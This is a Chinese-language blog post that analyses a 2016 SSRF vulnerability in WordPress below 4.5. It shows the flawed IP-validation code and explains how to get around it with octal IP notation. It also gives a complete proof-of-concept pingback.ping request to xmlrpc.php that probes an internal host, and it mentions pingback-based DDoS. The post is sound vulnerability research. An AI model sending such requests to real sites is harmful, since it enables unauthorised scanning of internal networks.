---
title: wordpress SSRF <4.5
date: 2016-08-19 15:05:19
tags: 
 - 漏洞分析
categories: codereview
---

### 概述

前几天，wordpress爆出一个SSRF的漏洞，跟进一下，查阅了一下，网上并没有详细的利用方式。以前也没怎么接触过wordpress，看了一下受影响的代码，记录一下过程。
<!-- more -->

### ip地址的几种表示方式

ip地址域名有多种表示方式，浏览器都能识别出来。

###### 常见的ip地址域名表示方法

- 点分十进制表示法，例如192.168.1.2
- 二进制表示法例如11000000101010000000000100000010，表示192.168.1.2

###### 非常见ip地址域名表示方法

- 整数型：将上述的二进制直接转换成整数3232235778，浏览器通过访问http://3232235778 解析为192.168.1.2，除此之外还可以通过公式`192*256^3+168*256^2+1*256+2=3232235778`换算
- 八进制型：将IP 192.168.1.2换成8进制0300.0250.01.02，在前面加上0表示8进制
- 十六进制型：将IP 192.168.1.2换成16进制0xc0.0xA8.1.2，在前面加上0x表示16进制
- 混合型：即以上的几种方式的结合，0300.0xA8.1.0x02

下面就是通过八进制绕过检测。

### 代码详情

漏洞成因处508 `wp_http_validate_url` 函数
```php
......
if ( ! $same_host ) {
		$host = trim( $parsed_url['host'], '.' );
		if ( preg_match( '#^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$#', $host ) ) {
			$ip = $host;
		} else {
			$ip = gethostbyname( $host );
			if ( $ip === $host ) // Error condition for gethostbyname()
				$ip = false;
		}
		if ( $ip ) {
			$parts = array_map( 'intval', explode( '.', $ip ) );
			if ( 127 === $parts[0] || 10 === $parts[0] || 0 === $parts[0]
				|| ( 172 === $parts[0] && 16 <= $parts[1] && 31 >= $parts[1] )
				|| ( 192 === $parts[0] && 168 === $parts[1] )
			) {
        ......
```
这里的代码通过正则表达式`^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$`判断ip是否合法，如果不合法则通过网络获取ip的值。
下面的if判断则是用来防止给的url为内网ip，但是上述的正则表达式可以通过8进制绕过内网限制。
```php
if ( empty( $parsed_url['port'] ) )
		return $url;

	$port = $parsed_url['port'];
	if ( 80 === $port || 443 === $port || 8080 === $port )
		return $url;
```
再接下来可以看到程序又对端口做了限制，只能扫描80,443,8080端口。
综上所述，通过8进制绕过ip判断，可以扫描内网的80,443,8080
找一下调用的位置,可以找到class-wp-xmlrpc-server.php通过wp_safe_remote_get调用了get函数，get函数使用了wp_http_validate_url，从而造成ssrf
### 利用
利用的方式为通过xmlrpc.php中pingback.ping功能来调用这个函数。
POC
```
POST /cms/wordpress/wp442/xmlrpc.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 321

<?xml version="1.0" encoding="iso-8859-1"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://012.10.10.111:8080/testvul</string></value></param><param><value><string>http://localhost/cms/wordpress/wp442/2016/08/19/hello-world/</string></value></param>
</params>
</methodCall>
```
这里设置10.10.10.111为受害者
![image](http://blog.0kami.cn/img/wordpress_ssrf_4_4_2/wordpress-ssrf.png)
### 总结
在测试中发现只能对10.x.x.x的内网ip进行利用，因为正则的原因至多只能有3位数字，一位需要为0来表示8进制，所以利用只有10,并且只能扫描80,443,8080端口。由于利用中不回显，也很难确定是否成功利用。所以这个洞可能危害比较小（太菜了，想不到其他的利用方式，有其他的利用方式记得分享啊！！！）
还有一种利用就是开启xmlrpc的wordpress站可以被通过pingback.ping方法来DDOS，这个以前就有人提出来了。
## 参考
http://xlab.baidu.com/wordpress/
https://virusdefender.net/index.php/archives/733/


